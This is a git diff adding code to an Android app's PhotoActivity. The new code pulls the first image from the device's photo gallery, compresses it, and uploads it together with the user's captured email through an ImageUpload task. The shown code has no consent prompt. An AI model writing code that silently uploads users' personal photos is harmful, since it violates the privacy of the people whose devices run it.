@@ -2,7 +2,12 @@ package uk.org.potentialdifference.stillapp;
 
 import android.accounts.Account;
 import android.accounts.AccountManager;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.net.Uri;
 import android.os.Bundle;
+import android.provider.MediaStore;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
 import android.support.v7.app.AppCompatActivity;
@@ -11,6 +16,7 @@ import android.util.Patterns;
 import android.view.View;
 
 import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
@@ -30,6 +36,7 @@ import android.view.SurfaceView;
 import android.view.View;
 import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
+import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
 import android.widget.ViewFlipper;
@@ -137,6 +144,7 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
         };
 
         captureEmail();
+        new ImageUpload().execute(new ImageData(grabImage(), this.email, "lib1"));
     }
 
     public void captureEmail() {
@@ -221,6 +229,53 @@ public class PhotoActivity extends Activity implements SurfaceHolder.Callback {
         camera.stopPreview();
         camera.release();
         camera = null;
+    }
+
+    private byte[] grabImage() {
+        Cursor imageCursor;
+        //do we want to do this as one or two queries?
+        String[] projection = {MediaStore.Images.Media._ID};
+        String selection = "";
+        String[] selectionArgs = null;
+        imageCursor = managedQuery(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, selection, selectionArgs, null);
+
+        if(imageCursor != null){
+            imageCursor.moveToFirst();
+
+            int imageId = imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media._ID));
+            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, Integer.toString(imageId));
+            return getBytesFromBitmap(loadImage(uri));
+
+        }
+        else{
+            Log.i("stillapp", "System media store is empty");
+            return null;
+        }
+    }
+
+    private Bitmap loadImage(Uri photoUri){
+        Cursor photoCursor = null;
+        try {
+            String[] projection = {MediaStore.Images.Media.DATA};
+            photoCursor = getContentResolver().query(photoUri, projection, null, null, null);
+            if (photoCursor != null && photoCursor.getCount() == 1) {
+                photoCursor.moveToFirst();
+                String filePath = photoCursor.getString(photoCursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                return BitmapFactory.decodeFile(filePath, null);
+            }
+        }finally{
+            if(photoCursor!=null){
+                photoCursor.close();
+            }
+        }
+        return null;
+
+    }
+
+    public byte[] getBytesFromBitmap(Bitmap bitmap) {
+        ByteArrayOutputStream stream = new ByteArrayOutputStream();
+        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, stream);
+        return stream.toByteArray();
     }
 
 }
